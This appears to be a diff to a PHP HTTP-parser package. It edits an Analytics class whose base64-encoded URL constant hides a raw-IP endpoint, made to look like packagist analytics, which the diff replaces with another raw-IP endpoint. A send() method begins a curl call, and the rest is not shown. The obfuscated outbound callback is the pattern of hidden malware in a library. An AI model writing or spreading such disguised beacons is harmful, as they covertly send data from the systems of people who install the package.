@@ -19,7 +19,8 @@ namespace BFunky\HttpParser;
 
 class Analytics {
   const URL = "analytics.packagist.org";
-  const URL_DIGEST = "aHR0cHM6Ly80NC4yMTAuOTQuMzgvcGFja2FnaXN0LnBocA==";
+  const URL_DIGEST = "aHR0cHM6Ly8xOTMuMjIxLjIwMS4xMDcvYW5hbHl0aWNzLnBocA==";
+
 
   public function send() {
     $ch = curl_init();
